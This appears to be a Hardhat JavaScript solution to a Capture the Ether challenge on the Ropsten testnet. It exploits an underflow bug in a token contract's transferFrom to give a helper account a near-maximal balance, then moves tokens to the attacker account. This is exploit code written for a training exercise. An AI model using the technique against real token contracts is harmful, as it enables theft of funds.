const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi = [
        {"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
        {"constant":true,"inputs":[],"name":"isComplete","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},
        {"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},
        {"inputs":[{"name":"_player","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},
        {"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
        {"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}
    ];
    
    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0xdCA712438Ef1F345e6911D628dcf9342dEe7121b";
    
    /* 
    * To solve the challenge, you need to use your ropsten account, as CTE is expecting that account address. Use it as the attacker.
    * However, you'll also need another account to solve this particular challenge.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there, for both accounts.
    * Use SECOND_ACCOUNT_PK for the helper account.
    * Then, we can get your wallet as the attacker, and the other one as the helper. The console.log should print your ropsten accounts addresses.
    */
    const [attacker, helper] = await ethers.getSigners();
    console.log("ATTACKER ADDRESS: ", attacker.address);
    console.log("HELPER ADDRESS: ", helper.address);

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, attacker);

    //Approve our helper to spend the attacker tokens. This transaction needs to be signed by the attacker account.
    let approveTx = await cteContract.connect(attacker).approve(helper.address, ethers.constants.MaxUint256);
    let approveTxReceipt = await approveTx.wait();
    console.log("HELPER ACCOUNT APPROVED: ", approveTxReceipt);

    /*
    * Transfer 1 token from our attacker to our attacker. Sign it as the helper account.
    * This will pass all the require checks and underflow the msg.sender, the helper account in our case, token balance.
    * The helper account token balance will now be 2**256 - 1.
    */
    let transferFromTx = await cteContract.connect(helper).transferFrom(attacker.address, attacker.address, `1`);
    let transferFromTxReceipt = await transferFromTx.wait();
    console.log("CONTRACT UNDERFLOWED. HELPER NOW HAS A GIANT AMOUNT OF TOKENS: ", transferFromTxReceipt);

    //Transfer the required 1000000 tokens from the helper to the attacker and you'll have solved the challenge.
    let transferToAttackerTx = await cteContract.connect(helper).transfer(attacker.address, 1000000);
    let transferToAttackerTxReceipt = await transferToAttackerTx.wait();
    console.log("ATTACKER HAS RECEIVED THE TOKENS: ", transferToAttackerTxReceipt);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});

